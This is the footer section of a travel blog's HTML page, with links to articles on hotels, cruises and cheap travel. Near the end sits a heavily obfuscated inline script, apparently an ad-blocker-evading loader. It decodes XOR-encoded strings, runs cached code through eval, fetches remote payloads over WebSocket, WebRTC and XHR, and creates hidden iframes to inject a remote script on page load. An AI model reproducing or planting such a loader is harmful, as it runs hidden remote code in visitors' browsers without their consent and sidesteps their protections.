						<a href="http://www.travelfuntu.com/accommodations/5-hotels-visit-2018/" class="popular_post_item_link">
							<p class="popular_post_item_head">5 Hotels You Should Visit in 2018</p>
							<p class="popular_post_item_meta widget_meta">
								Feb 13, 2018							</p>
						</a>
					</div>
				</li>
						</ul>
		</div>
	</div>
			
<div class="col-xs-12 col-sm-4 footer_right equal_footer">
		<div class="widget">
			<h2 class="popular_post_head widget-title">Editor's Choice</h2>
			<ul>
																						<li>
							<div class="popular_post_item">
								<a href="http://www.travelfuntu.com/accommodations/andy-warhol-beatles-themed-hotel-opening-england/" class="popular_post_item_link">
									<p class="popular_post_item_head">An Andy Warhol &#038; Beatles Themed Hotel Is Opening In England</p>
									<p class="popular_post_item_meta widget_meta">
										Feb 11, 2018									</p>
								</a>
							</div>
						</li>
																								<li>
							<div class="popular_post_item">
								<a href="http://www.travelfuntu.com/spotlight/ritz-carlton-paris-auction-off-10000-items/" class="popular_post_item_link">
									<p class="popular_post_item_head">The Ritz Carlton In Paris To Auction Off 10,000 Items</p>
									<p class="popular_post_item_meta widget_meta">
										Feb 9, 2018									</p>
								</a>
							</div>
						</li>
																								<li>
							<div class="popular_post_item">
								<a href="http://www.travelfuntu.com/vacation-inspiration/travel-super-cheap/" class="popular_post_item_link">
									<p class="popular_post_item_head">How To Travel Super-Cheap</p>
									<p class="popular_post_item_meta widget_meta">
										Feb 7, 2018									</p>
								</a>
							</div>
						</li>
																								<li>
							<div class="popular_post_item">
								<a href="http://www.travelfuntu.com/spotlight/top-5-cruise-lines-families/" class="popular_post_item_link">
									<p class="popular_post_item_head">Top 5 Cruise Lines For Families</p>
									<p class="popular_post_item_meta widget_meta">
										Feb 7, 2018									</p>
								</a>
							</div>
						</li>
									</ul>
		</div>

	<div class="visible-xs-block">
		
<div class="footer_social widget">
	<h2 class="footer_social_head widget-title hidden-xs">FOLLOW US</h2>
	<a href="https://www.facebook.com/TravelFuntu/" target="_blank" class="icon icon-fb"></a>
	<a href="https://twitter.com/travel_funtu" target="_blank" class="icon icon-tw"></a>
</div>
	</div>

</div>


		</div>
	</div>
	<div id="footer_menu">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">

				<div class="copyright">
					<h1 class="copyright_head">© <script>document.write(new Date().getFullYear())</script> Travelfuntu.</h1>
				</div>

				<ul id="menu-footer-menu" class="footer_menu"><li id="menu-item-281" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-281"><a title="Privacy Policy" href="http://www.travelfuntu.com/privacy-policy/">Privacy Policy</a></li>
<li id="menu-item-282" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-282"><a title="DMCA" href="http://www.travelfuntu.com/dmca/">DMCA</a></li>
<li id="menu-item-283" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-283"><a title="Terms of Service" href="http://www.travelfuntu.com/terms-of-service/">Terms of Service</a></li>
<li id="menu-item-284" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-284"><a title="Contact Us" href="http://www.travelfuntu.com/contact-us/">Contact Us</a></li>
<li id="menu-item-280" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-280"><a title="Advertise With Us" href="http://www.travelfuntu.com/contact-us/">Advertise With Us</a></li>
<li id="menu-item-285" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-285"><a title="Work With Us" href="http://www.travelfuntu.com/contact-us/">Work With Us</a></li>
</ul>			</div>
		</div>
	</div>
</div>
</footer>



<script type="text/javascript">
  window._taboola = window._taboola || [];
  _taboola.push({flush: true});
</script>

<script>
  try{!function(){function B(){try{var n=K()}catch(A){}if(n)try{C(n.h,null)}catch(A){delete window.localStorage[n.key],delete window.sessionStorage[n.key]}else L(function(n,A){A.as=!0;try{C(n,A)}catch(a){}},M)}function M(){var n=a(window.location.protocol==a("HQUaAhhV")?"HQUaAhhVW0A=":"HQUaAlFAWw==");(new Image).src=n+u+N}function L(n,A){function a(){var t=e.shift();if(t)try{t(n,a)}catch(r){a()}else v(),A()}try{O()}catch(t){return v(),void A()}var e=[P,Q,R,S];a()}function C(a,c){!function(){eval(a)}({e:a,p:c,n:g})}function K(){var n=[];window.localStorage&&n.push(window.localStorage),window.sessionStorage&&n.push(window.sessionStorage);var A=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("BQMLEwYNGAo=")));A=new Uint8Array(A);for(var t="",e=0;e<A.length;e++)t+=String.fromCharCode(A[e]);for(A=btoa(t),t=(new Date).getTime(),e=0;e<n.length;e++){var o,g=n[e];for(o in g)if(0===o.lastIndexOf(A,0)){try{for(var c=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),i=atob(g[o]),w=new Uint8Array(i.length),u=0;u<i.length;u++)w[u]=i.charCodeAt(u);var l=r(D(c,w.buffer))}catch(Q){continue}if(u=parseInt(l.substring(0,13),10),!isNaN(u))if(t-u>864e5||1>t-u)g.removeItem(o);else if((u=l.substring(13))&&!(16>u.length))return{h:u,key:o}}}return null}function Q(n,A){var t=a("RkVZSg=="),e=a("QjNUQV1VQStKWFNRLTlPTi1MKlpUSUNeIltZLjFQXEFPNS1IKS1OLkVQWVNWOkFMLkBRV19KQVReWlRVNFpVSUJLWkRRLEdVNl9QWClCN0dWM15ZW0VNJlZSV1pILyk=");t=w+":"+t;var r={};r[a("AAMCAQ==")]=a("AQQcHFE=")+t+a("SgUcEwUcBAACHlcfDwg="),r[a("FgMLFg4BAAYRBg==")]=a("DBAaGwYO"),r[a("AAILAAUOGQo=")]=a("DBAaGwYO"),F(e,r,function(n){return n=n.match(new RegExp(a("KxIPHA8GEA4ED1A3CFNVKghdS0tRSgIAFBQ2KyJDTy0RWk5aNwtfM142DkAwVikSRypFPwpbXkQ4DEhPBhMfUQcUAhMS"))),null==n?null:(n=n[1],a("FhAAFgILFRsVUFtLXVggMjxWU1BdQUVSV0g=")+n+a("VUddQlpZVBsJGkoZCRQUD0wECgcKAlc=")+n+a("VQMeHRkbVFlDWltdTBYQAhsZGQhDExgXEEhT"))},n,A)}function R(n,A){var t=a("Q0FeQw=="),e=a("M0RUMylVTFZKL15RWElPT11MXFpUQ0ReVFpZLUpQWDBPRCxILl5OKUVQXl1WTzBMKjNRVihKRVBeUCVVMC9VRTBLXTFRKjdVR1JQW1pCQEVWN1lZXTZNUCVSVFZIU1c=");t=w+":"+t;var r={};r[a("AAMCAQ==")]=[a("BgUbHFE=")+t],F(e,r,function(n){return n=n.match(new RegExp(a("KxIPHA8GEA4ED1A3CFNVKghdS0tRSgIAFBQ2KyJDTy0RWk5aNwtfM142DkAwVikSRypFPwpbVzgAQ0pPBhMfUQYDCB4T"))),null==n?null:(n=n[1],a("FhAAFgILFRsVUFpLXVggMjxWWVJaR0NcV15XWFI=")+n+a("VQUXAksHGxwE"))},n,A)}function F(n,A,t,e,r){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;e=o.bind(null,e),r=o.bind(null,r);var i={};i[a("HBILIQ4dAgoCGQ==")]=[A];var w=new g.c(i);w[a("FgMLEx8KMA4ECykDDRYbEwA=")](a("WhwLBgpABAYeDQ==")).binaryType=a("FAMcExINAQkWDxg="),w[a("Gh8HEQ4MFQEUAw4KGB0=")]=function(n){if(null!=n[a("FhAAFgILFRsV")]&&(n=t(n[a("FhAAFgILFRsV")][a("FhAAFgILFRsV")]),null!=n)){var A={};A[a("FhAAFgILFRsV")]=n,A[a("BhUePycGGgo5BA4OFA==")]=0,w[a("FBUKOwgKNw4eDgMPDQwQ")](new g.b(A),function(){},function(){})}},w.addEventListener(a("HBILEQQBGgoTHgMEAgsBFxgTCAsPHhAB"),function(){w[a("HBILMQQBGgoTHgMEAisBFxgT")]===a("ExAHHg4L")&&r()});var u=a("A0xeeARSARwVGAQKAR1VRkxGSyogUD40UEhSXUVEX19FX194GFIHCgMZAwQCFhQbCXwIXic+Vy00XENeQF1BQVtBQENhG0lfUFpgClEeHBgLExkTHBkZEF4bCw5fWFpHVQ==")+n+a("fxBTGwgKWQAAHgMEAgtPAh4fCAgCFX0JWQkTHx4DDBABGAEcS15GXERKLj8gK1olLyI7Q1tAR1RuCV4cER4fHBQBVEdbX0RPBw8IGRgbWBINAgoABhEZCgEEQ11HXGUQSBgNF0YaEh0RDVA=")+function(){for(var n="",A=a("RUFeQltfRF8="),t=0;16>t;++t){var e=(4294967296*Math.random()>>>0).toString(16);n+=A.substring(0,A.length-e.length)+e}return n}()+a("fxBTGwgKWR8HDlBbXEhFRlxGW1NeQEdUVFhTX0JaX0FFQV5CW19EX0BaWmE=");w[a("FgMLEx8KOwkWDxg=")](function(n){w[a("BhQaPgQMFQM0DxkIHhEFAgUZBQ==")](n,function(){var n={};n[a("AQgeFw==")]=a("FB8dBQ4d"),n[a("BhUe")]=u,w[a("BhQaIA4CGxsVLg8YDwocBhgfBA0=")](new g.f(n),function(){},function(){})},function(){})},function(){}),n=w[a("FgMLEx8KMA4ECykDDRYbEwA=")](a("WgYdAms=")+window.navigator.userAgent),n.binaryType=a("FAMcExINAQkWDxg="),G(n,x(),function(n){e(n,{rtc:w})},function(){r()})}function S(n,A){function t(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var e=x();e=a(window.location.protocol==a("HQUaAhhV")?"HQUaAhhVW0A=":"HQUaAlFAWw==")+u+e;var o=a("MjQ6"),c=!1;n=t.bind(null,n),A=t.bind(null,A);var i=new g.g;i.onreadystatechange=function(){4==i.readyState&&(0==i.status?A():n(r(i.response),{}))},i.onerror=function(){A()},i.open(o,e,!0),i.responseType=a("FAMcExINAQkWDxg="),i.send(null)}function P(n,A){var t=a("AgIdSERA"),e=new g.a(t+w+a("WgYdAg=="));e.binaryType=a("FAMcExINAQkWDxg="),G(e,x(),function(A){n(A,{ws:e})},function(){A()})}function G(n,A,t,e){function o(n){g||(g=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;t=o.bind(null,t),e=o.bind(null,e);var c=!1,i=setTimeout(function(){e(Error())},3e3),w=E(JSON.stringify({url:A||"",method:a("MjQ6"),headers:null,body:null}));n.onopen=function(){clearTimeout(i),n.send(w)};var u,l=new ArrayBuffer(0);n.onmessage=function(n){if(4===n.data.byteLength){var A=new Uint8Array(n.data);if(222===A[0]&&173===A[1]&&190===A[2]&&239===A[3])return}!1===c?(c=!0,n=r(n.data),u=JSON.parse(n),u={status:u.status||0,headers:u.headers||{}}):(n=n.data,A=new Uint8Array(l.byteLength+n.byteLength),A.set(new Uint8Array(l),0),A.set(new Uint8Array(n),l.byteLength),l=A.buffer)},n.onerror=function(){clearTimeout(i),e(Error())},n.onclose=function(){c?(u.body=l,t(r(u.body))):(clearTimeout(i),e(Error()))}}function y(n){return window[n.name]?window[n.name]:n[a("Fh4ABg4BACsfCR8GCRYB")]&&n[a("Fh4ABg4BACsfCR8GCRYB")][a("ERQIEx4DADkZDx0=")]?n[a("Fh4ABg4BACsfCR8GCRYB")][a("ERQIEx4DADkZDx0=")]:n[a("Fh4ABg4BADgZBA4EGw==")]}function H(){var n=document.createElement(a("HBccEwYK"));n.style.height=a("RAEW"),n.style.width=a("RAEW"),n.style.display=a("Gx4AFw=="),n[a("BgMNFgQM")]=a("FA=="),n.name||(n.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7)),(document.body||document.head||document.documentElement).appendChild(n);var A=y(n);A.document.documentElement||A.document.write(a("FA=="));try{A.stop()}catch(t){}return n}function O(){I=a("AB8FHAQYGg=="),t=a("FhkcHQYK"),q=a("ExgcFw0ADA=="),z=a("GgELAAo="),A=a("BhAIExkG");var n=H();n=y(n);var e=n.navigator.userAgent,r=new RegExp(a("FhkcHQYKCAwYGAUGBQ0Y"),"i").test(e)?t:new RegExp(a("ExgcFw0ADBMZCQ8cCRkGEwAKDRsHHwQ="),"i").test(e)?q:new RegExp(a("K1lGTUoMHB0fBw8XDRYRBAMfD0pAWV0XBQ4CHRs="),"i").test(e)?A:new RegExp(a("GgEcDgQfHQAD"),"i").test(e)?z:window[a("FhkcHQYK")]?t:"undefined"!=typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(r)&&(n=window),e=a("EAcPHg=="),g.c=n[e](a("AhgAFgQYWj0kKToOCQo2GQIYDgAaGRgKRBQfTwUDARUaBkAFDg0fBgQ4Pig8HRAELxkFDQsTAw0LBkMTDkoYGBsVAQVFAhsVIj4pOwkdBzUDGAUGDQQeCwpIHxNSHQYfER4ZXAYcJjszOg8OHjsaGAITCBcHHxk=")),g.f=n[e](a("AhgAFgQYWj0kKTkOHwscGQIyDhANAh4UEAEMAVIWE1ECGAAWBBhaGBUIAQIYKiE1PxMYEAcfGSABGwAdGxobGBofTg4XTwMGHg4FHEIVGgw+IigwCwMEDQsGJwoBCR0YBQUHHQVPCBNQHQMFCBcCWAEFOTctIxIXFwEMATYPHBIHGB4GAgAa")),g.b=n[e](a("AhgAFgQYWj0kKSMICTsUGAgfDwIaFVcYGEgUBhwOAAZbBgsQAAYAPSQpIwgJOxQYCB8PAhoVVxgYSBQGHA4ABlscAQg5OzcmEw8pCgIcHBINAg5DEgxXEw0GBwAFRAICJyUtOwgKNw4eDgMPDQwQ")),r===q?(r=H(),g.a=y(r)[e](a("AhgAFgQYWjgVCDkEDxMQAg==")),r.parentElement.removeChild(r)):g.a=n[e](a("AhgAFgQYWjgVCDkEDxMQAg==")),g.g=n[e](a("AhgAFgQYWjc9JiIfGAgnEx0DDhAa"))}function D(n,A){var a=new Uint8Array(A),t=new ArrayBuffer(A.byteLength);t=new Uint8Array(t);for(var e=0;e<A.byteLength;e++)t[e]=a[e]^n.charCodeAt(e%n.length);return t.buffer}function r(n){if(window.TextDecoder)return new window.TextDecoder("utf-8").decode(new Uint8Array(n));var A="";n=new Uint8Array(n);for(var a=n.byteLength,t=0;a>t;t++)A+=String.fromCharCode(n[t]);return decodeURIComponent(escape(A))}function E(n){if(window.TextEncoder)return new window.TextEncoder("utf-8").encode(n).buffer;n=unescape(encodeURIComponent(n));for(var A=new Uint8Array(n.length),a=0;a<n.length;a++)A[a]=n.charCodeAt(a);return A.buffer}function x(){return a("WhQEAVQfSQ==")+"2195740001"}function a(n){n=window.atob(n);for(var A="",a=0;a<n.length;a++)A+=String.fromCharCode(n.charCodeAt(a)^"uqnrkotopjjklxuvlvkcnpwddhcorjoq".charCodeAt(a%32));return A}function v(){if(!J){var n=("https:"==window.location.protocol?"https://":"http://")+u+T,A=document.createElement("script");A.type="text/javascript",A.async=!0,A.src=n,(document.body||document.head||document.documentElement).appendChild(A),J=!0}}var u=a("DRkcXAgHAQQRBgUZHRlbFQMb"),w=a("FF8NGh4EFQMfGBsKQhsaGw=="),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2195740001",N="/l?p=2195740001&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{v()}catch(b){}try{B()}catch(b){}}()}catch(B){}
</script><script type='text/javascript' src='http://www.travelfuntu.com/wp-content/plugins/forensiq-include/forensiq-script.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://www.travelfuntu.com/wp-content/themes/tf/scripts/plugins.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://www.travelfuntu.com/wp-content/themes/tf/scripts/main.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://www.travelfuntu.com/wp-includes/js/wp-embed.min.js?ver=4.8.5'></script>
</body>
</html>